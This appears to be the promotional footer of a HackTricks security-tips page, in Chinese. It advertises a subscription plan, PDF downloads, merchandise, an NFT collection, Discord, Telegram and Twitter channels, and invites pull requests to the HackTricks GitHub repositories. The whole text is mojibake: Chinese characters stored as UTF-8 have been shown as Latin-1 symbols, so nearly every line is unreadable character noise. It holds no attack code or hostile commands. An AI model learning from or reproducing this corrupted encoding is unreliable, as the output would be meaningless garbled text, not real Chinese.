* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
